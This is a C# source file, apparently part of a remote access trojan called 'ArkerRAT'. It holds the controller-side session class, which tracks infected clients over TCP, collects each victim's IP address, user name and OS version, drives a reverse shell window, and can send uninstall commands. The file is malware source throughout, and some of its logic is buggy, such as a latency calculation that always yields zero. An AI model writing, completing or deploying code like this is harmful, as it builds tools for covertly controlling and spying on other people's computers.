using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Controls;
using System;
using System.Windows;
using System.Diagnostics;
using ArkerRatWpfVersion;

namespace ArkerRAT1
{
    public class RATHostSession
    {
        public CancellationTokenSource source = new CancellationTokenSource();

        CancellationToken token;

        //This button is too know which client button belongs to which client.
        public Button clientButton = new Button();

        public string tags { get; set; }

        public string iPadress = "Unknown";
        public double ms = 0;
        public string userName = "Unknown";
        public string OSVersion = "Unknown";

        public TcpClient client { get; set; }
        public NetworkStream clientStream { get; set; }
        public RATHostSession(TcpClient tcpClient, string tag)
        {
            
            client = tcpClient;
            clientStream = tcpClient.GetStream();
            token = source.Token;
            clientButton.Tag = tag;
            tags = tag;

            ReadData();

            Ping();
        }

        public async Task ReadData()
        {
            try
            {
                while (!token.IsCancellationRequested)
            {
               
                    byte[] data = new byte[1024];
                    await clientStream.ReadAsync(data, 0, data.Length);
                    DecideCyberTool(Encoding.UTF8.GetString(data, 0, data.Length).Trim('\0'));
                    await clientStream.FlushAsync();
                }

            }
            catch (Exception ex) { }
        }

        public async Task SendData(string textData)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(textData);
                await clientStream.WriteAsync(data, 0, data.Length);
                await clientStream.FlushAsync();
            }
            catch(Exception ex) { }
        }

        string whenToStartPinging = "";
        string[] firstTimeStamp = DateTime.Now.ToLongTimeString().Split(':', ' ');
        string[] secondTimeStamp = DateTime.Now.ToLongTimeString().Split(':', ' ');
        private async void Ping()
        {
            await Task.Run(async () =>
            {
                try
                {
                    int timedOut = 0;
                    while (!token.IsCancellationRequested)
                    {
                        if (whenToStartPinging == "")
                        {
                            firstTimeStamp = DateTime.Now.ToLongTimeString().Split(':', ' ');
                            await SendData("§Ping§");

                            whenToStartPinging = "waitForCallBack";
                        }

                        if (whenToStartPinging == "§Ping§")
                        {
                            secondTimeStamp = DateTime.Now.ToLongTimeString().Split(':', ' ');

                            double msSec = Convert.ToDouble(firstTimeStamp[2]);
                            double msMin = Convert.ToDouble(firstTimeStamp[1]) * 60;
                            double msH = Convert.ToDouble(firstTimeStamp[0]) * 60 * 60;

                            double msSec2 = Convert.ToDouble(firstTimeStamp[2]);
                            double msMin2 = Convert.ToDouble(firstTimeStamp[1]) * 60;
                            double msH2 = Convert.ToDouble(firstTimeStamp[0]) * 60 * 60;

                            ms = (((msSec2 + msMin2 + msH2) - (msSec + msMin + msH))) * 1000;
                            whenToStartPinging = "";
                            timedOut = 0;
                        }
                        Thread.Sleep(5000);
                        timedOut++;
                        if(timedOut == 5)
                        {
                            Disconnect(this, new EventArgs());
                        }
                    }
                }
                catch (Exception ex) { }


            });
        }

        public void RemoveThisClientUI()
        {
            Task.Run(() =>
            {
                if (reverseShellWindow != null)
                {
                    reverseShellWindow.Close();
                }
                source.Cancel();
                clientStream.Close();
                client.Close();
                ArkerRATServerMechanics.RATClients.Remove(this);
            }); 
        }

        public async void Disconnect(object sender, EventArgs e)
        {
            await SendData("§Disconnect§");
            RemoveThisClientUI();
            RemoveThisClientUI();
            RemoveThisClientUI();

        }


        public async void Uninstall(object sender, EventArgs e)
        {
            await SendData("§Uninstall§");
            RemoveThisClientUI();

        }

        public ReverseShellWindow reverseShellWindow;

        public void StartReverseShell(object sender, EventArgs e)
        {
            reverseShellWindow = new ReverseShellWindow(this);
            reverseShellWindow.WindowState = WindowState.Normal;
            reverseShellWindow.Activate();
            reverseShellWindow.Show();
        }

        private async void DecideCyberTool(string data)
        {
            if (data.Contains("§ReverseShell§"))
            {
                reverseShellWindow.data = data.Replace("§ReverseShell§", "").Replace("§Ping§", "");
                await reverseShellWindow.ReversShellFunction();
            }

            if (data.Contains("§Ping§"))
            {
                whenToStartPinging = "§Ping§";
            }

            if (data.Contains("§IP§"))
            {
                data.Replace("§IP§", "");
                string bugfix = data.Replace("§IP§", "");

                iPadress = bugfix.Replace("§Ping§", "");
            }

            if (data.Contains("§UserName§"))
            {
                data.Replace("§UserName§", "");
                string bugfix = data.Replace("§UserName§", "");
                userName = bugfix.Replace("§Ping§", "").Replace("§OSVersion§", "");
            }

            if (data.Contains("§OSVersion§"))
            {
                data.Replace("§OSVersion§", "");
                string bugfix = data.Replace("§OSVersion§", "");

                OSVersion = bugfix.Replace("§Ping§","").Replace("§OSVersion§", "").Replace("§UserName§", "");
            }
        }
    }
}
